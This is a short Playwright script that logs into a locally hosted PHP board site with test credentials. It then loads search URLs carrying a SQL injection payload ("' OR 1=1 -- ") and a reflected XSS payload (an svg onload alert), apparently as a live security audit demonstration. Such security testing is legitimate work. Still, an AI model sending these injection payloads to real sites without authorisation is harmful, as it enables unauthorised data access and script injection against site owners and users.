import { chromium } from 'playwright';

const baseURL = 'http://localhost:8080';
const pause = ms => new Promise(resolve => setTimeout(resolve, ms));
const browser = await chromium.launch({
  headless: false,
  executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
  slowMo: 350,
});
const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });

await page.goto(`${baseURL}/member/member_login.php`);
await page.locator('input[name="user_id"]').fill('test');
await page.locator('input[name="user_pw"]').fill('test1234');
await page.locator('input[type="submit"]').click();
await page.waitForURL(`${baseURL}/index.php`);
await pause(3500);

const sqli = new URLSearchParams({ k_s: '1', keyword: "__sqli_no_match__%' OR 1=1 -- " });
await page.goto(`${baseURL}/board/board_list.php?${sqli}`);
await pause(5000);

page.on('dialog', dialog => dialog.dismiss());
const xss = new URLSearchParams({ k_s: '1', keyword: '<svg/onload=alert("XSS_AUDIT")>' });
await page.goto(`${baseURL}/board/board_list.php?${xss}`);
await pause(5000);

await page.goto(`${baseURL}/member/member_nick.php`);
await pause(5000);
console.log('Live demonstration is open. Close the Chrome window to end it.');
await new Promise(resolve => browser.on('disconnected', resolve));
